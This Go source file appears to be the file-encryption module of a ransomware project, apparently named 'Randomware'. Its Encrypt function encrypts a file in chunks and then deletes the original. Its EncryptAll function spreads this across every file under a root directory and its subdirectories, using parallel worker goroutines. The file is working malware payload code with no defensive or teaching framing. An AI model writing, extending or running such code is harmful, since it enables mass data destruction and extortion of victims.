package file

import (
	"Randomware/encryption"
	"os"
	"sync"
)

// Encrypt : encrypts file with key
func Encrypt(fileSrc string, key *[]byte) (string, error) {

	encryptedFileName := fileSrc + EncryptedExt
	decryptedFile, err := os.Open(fileSrc)

	counter := []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}

	if err != nil {
		return "", err
	}

	fi, err := decryptedFile.Stat()

	if err != nil {
		return "", err
	}

	//Reads Data from file
	var i int64
	data := make([]byte, MaxSize)
	iterations := fi.Size() / int64(MaxSize)

	//Creates encrypted File
	encryptedFile, err := os.Create(encryptedFileName)

	if err != nil {
		return "", err
	}

	defer encryptedFile.Close()

	//Encrypts chunks of MaxSize data to encrypted file
	for i = 0; i < iterations; i++ {
		decryptedFile.Read(data)
		encryption.Encrypt(&data, key, &counter)
		_, err = encryptedFile.Write(data)
		if err != nil {
			return "", err
		}

		encryptedFile.Sync()
	}

	//Encrypts remaining of file (less then MaxSize)
	if fi.Size()%int64(MaxSize) != 0 {
		data = make([]byte, fi.Size()-iterations*int64(MaxSize))
		decryptedFile.Read(data)
		encryption.Encrypt(&data, key, &counter)
		_, err = encryptedFile.Write(data)
		if err != nil {
			return "", err
		}

		encryptedFile.Sync()
	}

	decryptedFile.Close()

	os.Remove(fileSrc)

	return encryptedFileName, nil
}

// EncryptAll : encrypts all files from root directory and all subdirectories
func EncryptAll(rootFolder string, key *[]byte) (uint64, error) {

	var wg sync.WaitGroup
	var mutex = &sync.Mutex{}
	var encryptedFilesNbr uint64 = 0
	xthreads := MaxThreads

	files, err := DiscoverFiles(rootFolder)
	if err != nil {
		return encryptedFilesNbr, err
	}
	filesNbr := uint64(len(files))
	ch := make(chan string, filesNbr) // This number can be anything as long as it's larger than xthreads

	// This starts xthreads number of goroutines that wait for something to do
	if uint64(xthreads) > filesNbr {
		xthreads = int(filesNbr)
	}
	wg.Add(xthreads)
	for i := 0; i < xthreads; i++ {
		go func() {
			for {
				file, ok := <-ch
				if !ok { // if there is nothing to do and the channel has been closed then end the goroutine
					wg.Done()
					return
				}
				if file[len(file)-len(EncryptedExt):] != EncryptedExt {
					_, err := Encrypt(file, key)
					if err == nil {
						mutex.Lock()
						encryptedFilesNbr++
						mutex.Unlock()
					}
				}
			}
		}()
	}

	// Now the jobs can be added to the channel, which is used as a queue
	for _, file := range files {
		ch <- file // add i to the queue
	}

	close(ch) // This tells the goroutines there's nothing else to do
	wg.Wait() // Wait for the threads to finish
	return encryptedFilesNbr, nil
}
